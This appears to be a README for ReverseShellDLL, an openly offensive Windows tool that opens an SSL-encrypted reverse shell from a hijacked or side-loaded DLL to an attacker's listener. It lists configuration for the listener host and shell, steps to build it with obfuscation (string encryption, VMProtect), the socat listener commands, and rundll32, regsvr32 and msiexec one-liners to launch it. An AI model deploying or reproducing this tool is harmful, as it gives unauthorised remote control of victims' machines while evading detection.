ReverseShellDLL
===============

Main Features
-------------
1. Universal DLL Hijack - ReverseShellDLL uses the DLL_PROCESS_ATTACH notification to ensure that the reverse shell is executed regardless of the export called. When the reverse shell exits, the process is gracefully terminated, hence the "export not found" error message will never show. 
2. SSL Encryption - ReverseShellDLL uses OpenSSL library to perform the encryption.
3. Statically Linked - ReverseShellDLL will run on all recent Windows versions out of the box without need for .NET framework or Microsoft C Runtime library to be installed.

![image](https://limbenjamin.com/media/reverseshelldll.png)

Configuration
-------------
```
domain 	- Domain/IP Address where listener is running
port 	- Port where listener is running
process - Shell to Execute (i.e. cmd.exe, powershell.exe, bash.exe)
exitCmd	- Typing this Cmd will cause the program to terminate


bufferSize (bytes) / delayWait (millisecs)
- High bufferSize and high delayWait will result in huge chunks of output to be buffered and sent at one time.
- Low bufferSize and low delayWait will result in "smooth" terminal experience at the expense of more small packets.  

* Some binaries verify that exports match before loading DLLs. You might have to change the export names in ReverseShellDLL.cpp to match the target hijack binary.

```

Compilation Instructions
------------------------
1. Install OpenSSL. I used the version from [https://slproweb.com/products/Win32OpenSSL.html](https://slproweb.com/products/Win32OpenSSL.html). Installation path is `C:\Program Files\OpenSSL-Win64`. Make sure to select the option to copy DLL to system folder during installation. Otherwise, you may have to tweak the Project Properties to get it to compile.
2. Git clone repository
3. Configure as necessary
4. Build binary

Running
-------
1. Generate SSL cert on listener machine
```shell
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
cat key.pem cert.pem > test.pem
```
2. Start listener. I have success with socat 1.7.3.2 and later. Earlier versions might have issues with protocol negotiation. If using bash, removing crnl from socat command line.
```shell
socat openssl-listen:1443,reuseaddr,cert=test.pem,verify=0,fork,crnl -
```
3. Deploy DLL in appropriate hijack location. If necessary, it can also be started via rundll32, regserver32 or other LOLBINs.
```shell
rundll32.exe ReverseShellDLL.dll,UniversalSoWhatEverYouTypeHereWillWork
rundll32.exe ReverseShellDLL.dll,CoCreateInstance
regsvr32.exe ReverseShellDLL.dll
msiexec /y "C:\path\to\dll\ReverseShellDLL.dll"
```


Credits
-------
1. Modified version of https://github.com/limbenjamin/ReverseShellDll
2. Added compile time string encryption https://github.com/JustasMasiulis/xorstr
3. Thanks to https://github.com/JackBro/BetaShield/tree/master/3rd/Protector/CodeVirtualizer for CodeVirtualizer x64
4. Thanks to https://github.com/Sthephanfelix/Overwatch-Aimbot/blob/master/VMProtectSDK64.lib for VMProtect x64